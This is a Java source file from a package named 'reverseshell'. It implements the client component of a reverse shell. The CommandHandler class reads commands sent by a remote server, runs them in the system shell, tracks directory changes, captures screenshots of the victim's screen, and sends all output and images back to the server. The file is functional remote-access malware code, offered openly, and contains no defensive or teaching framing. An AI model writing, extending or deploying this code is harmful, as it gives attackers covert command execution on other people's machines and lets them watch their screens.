package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.util.concurrent.TimeUnit;

public class CommandHandler {

    private final ServerConnection serverConnection;
    private String currentDir = System.getProperty("user.dir");

    public CommandHandler(ServerConnection serverConnection) {
        this.serverConnection = serverConnection;
    }

    public void handleCommands() throws IOException {
        String command;
        while ((command = serverConnection.readCommand()) != null) {
            if (command.equalsIgnoreCase("exit")) {
                System.out.println("[-] Server disconnected.");
                break;
            }

            StringBuilder fullResponse = new StringBuilder();

            if (command.startsWith("cd ")) {
                fullResponse.append(changeDirectory(command.substring(3).trim()));
            } else if (command.equalsIgnoreCase("screenshot")) {
                sendScreenShot();
                continue;
            } else {
                fullResponse.append(executeCommand(command));
            }

            serverConnection.sendResponse(fullResponse.toString().trim());
            serverConnection.sendResponse("End");
        }
    }

    private String changeDirectory(String newDir) {
        File dir = new File(newDir);
        if (!dir.isAbsolute()) {
            dir = new File(currentDir, newDir);
        }
        try {
            dir = dir.getCanonicalFile();
            if (dir.isDirectory()) {
                currentDir = dir.getAbsolutePath();
                return "Changed directory to: " + currentDir;
            } else {
                return "Error: Not a valid directory.";
            }
        } catch (IOException e) {
            return "Error: Unable to change directory - " + e.getMessage();
        }
    }

    private void sendScreenShot() {
        ScreenShot screenShot = new ScreenShot();
        byte[] imageBytes = screenShot.imageBytes();
        if (imageBytes.length > 0) {
            System.out.println("[DEBUG] Sending screenshot of size: " + imageBytes.length + " bytes");
            serverConnection.sendScreenShot(imageBytes);
        } else {
            System.err.println("[ERROR] Screenshot capture failed.");
            serverConnection.sendResponse("Error: Failed to capture screenshot.");
        }
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(OSUtils.getShell(), OSUtils.getShellFlag(), command);
            processBuilder.directory(new File(currentDir));
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            boolean finished = process.waitFor(10, TimeUnit.SECONDS);
            if (!finished) {
                process.destroy();
                return "Error: Command timed out.";
            }

            int exitCode = process.exitValue();
            if (exitCode != 0) {
                return "Error executing command, exit code: " + exitCode;
            }

        } catch (IOException | InterruptedException e) {
            return "Error executing command: " + e.getMessage();
        }
        return output.toString().trim();
    }
}
